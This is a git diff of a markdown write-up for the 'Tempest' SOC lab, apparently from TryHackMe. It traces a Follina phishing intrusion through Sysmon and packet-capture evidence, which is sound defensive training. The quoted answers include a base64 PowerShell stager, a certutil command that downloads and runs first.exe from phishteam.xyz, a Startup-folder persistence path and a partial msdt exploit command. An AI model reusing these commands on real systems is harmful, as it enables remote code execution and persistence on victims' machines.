@@ -1,5 +1,16 @@
 # Tempest
 
+## Table of Contents
+[Introduction](#introduction)
+[Task 3: Preparation - Tools and Artifacts](#task-3-preparation---tools-and-artifacts)
+[Task 4: Initial Access - Malicious Document](#task-4-initial-access---malicious-document)
+[Task 5: Initial Access - Stage 2 execution](#task-5-initial-access---stage-2-execution)
+[Task 6: Initial Access - Malicious Document Traffic](#task-6-initial-access---malicious-document-traffic)
+[Task 7: Discovery - Internal Reconnaissance](#task-7-discovery---internal-reconnaissance)
+[Task 8: Privilege Escalation - Exploiting Privileges](#task-8-privilege-escalation---exploiting-privileges)
+[Task 9: Actions on Objective - Fully-owned Machine](#task-9-actions-on-objective---fully-owned-machine)
+[Conclusions and Learning Outcomes](#conclusion-and-learning-outcomes)
+
 ## Introduction
 
 This room is a capstone challenge for the SOC 1 learning path. 
@@ -13,7 +24,7 @@ Tools used in this task:
 - Timeline Explorer
 - Wireshark
 
-The instructions do suggest using Brim occasionally but I never had to
+The instructions do suggest using Brim occasionally but I never had to.
 
 ### Task 3: Preparation - Tools and Artifacts
 This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView
@@ -58,25 +69,26 @@ Searching for file creation events (Event ID 11) and file stream creation events
 *Format: username-machine name*
 > benimaru-TEMPEST
 
-We can find this as the User field in the download events
+We can find this as the User field in the download events.
 
 **What is the PID of the Microsoft Word process that opened the malicious document?**
 > 496
 
-Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field
+Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field.
 
 <img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />
 
 **Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
 > 167.71.199.191
 
-Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field
+Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field.
+
 <img width="577" height="186" alt="image" src="https://github.com/user-attachments/assets/d2b2f15f-6f66-49c0-86d1-939661592757" />
 
 **What is the base64 encoded string in the malicious payload executed by the document?**
 > JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
 
-To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string
+To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string.
 
 
 **What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
@@ -84,7 +96,7 @@ To find this, we filter for events with ParentProcessID matching the PID of the 
 *Format: XXXX-XXXXX*
 > 2022-30190
 
-I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190
+I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190.
 
 ### Task 5: Initial Access - Stage 2 execution
 Now we can decode the base64, and look at the commands that it executes:
@@ -108,7 +120,7 @@ The task also gives us a few tips:
 **The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
 > C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path
+This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path.
 
 **The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**
 
@@ -116,8 +128,6 @@ This is the path we found in the obfuscated string, we just had to replace $app 
 > C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
 
 Filtering for processes with `C:\Windows\explorer.exe` as their ParentImage, the last entry with ParentUser TEMPEST\benimaru shows the command we are looking for.
-
-At this point I had only looked at the logs in Event Viewer, but I was running into 
 
 **Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
 > CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
@@ -141,7 +151,7 @@ For this task I used SysmonView. Selecting first.exe makes it easy to see the ne
 
 ### Task 6: Initial Access - Malicious Document Traffic
 We are now tasked with looking into the pcap file. We have the malicious domain and IP that we found in the last task.
-The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier
+The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier.
 
 #### Task 6 Questions:
 **What is the URL of the malicious payload embedded in the document?**
@@ -159,7 +169,8 @@ Many of the GET requests have a lot of encoded data in their queries, which seem
 
 <img width="1190" height="354" alt="image" src="https://github.com/user-attachments/assets/62a58132-f327-47ec-b587-4d165f4badd6" />
 
-The next 3 questions all have to do with what is shown in the last image
+The next 3 questions all have to do with what is shown in the last image.
+
 **The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**
 > q
 
@@ -226,7 +237,6 @@ Searching for the hash on VirusTotal shows a malicious file. The Names section g
 This is the service associated with the port we found earlier that could provide a remote shell.
 
 ### Task 8: Privilege Escalation - Exploiting Privileges
-
 We know that the attacker has gained a stable shell through a reverse socks proxy.
 The task tells us to look for these events:
 - Look for events executed after the successful execution of the reverse socks proxy tool.
@@ -270,10 +280,12 @@ This information is found in the event we saw earlier where `spf.exe` was used t
 **The binary connects to a different port from the first c2 connection. What is the port used?**
 > 8080
 
-Filtering the events for Network Connections (Event ID 3), and looking for events that happened shortly after when `spf.exe` was used to run `final.exe`, we can see multiple connections to `167.71.222.162`, all connecting to port `8080`
+Filtering the events for Network Connections (Event ID 3), and looking for events that happened shortly after when `spf.exe` was used to run `final.exe`, we can see multiple connections to `167.71.222.162`, all connecting to port `8080`.
 
 ### Task 9: Actions on Objective - Fully-owned Machine
+Our last task is to find all of the persistence techniques that the attacker used. It also tells us that the unusual executions are related to the malicious C2 binary used during privilege escalation (`final.exe`).
 
+The task gives us this advice:
 - Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
 - The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.
 - All child events of the new malicious binary used for C2 are worth checking.
@@ -294,7 +306,6 @@ Filtering for events with `final.exe` as the parent process, we can see two `"C:
 Shortly before the other users were added, this command was run:
 
 <img width="848" height="45" alt="image" src="https://github.com/user-attachments/assets/84c78763-e95e-4fa6-98a0-89c2a7cd0769" />
-
 
 **Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**
 > 4720
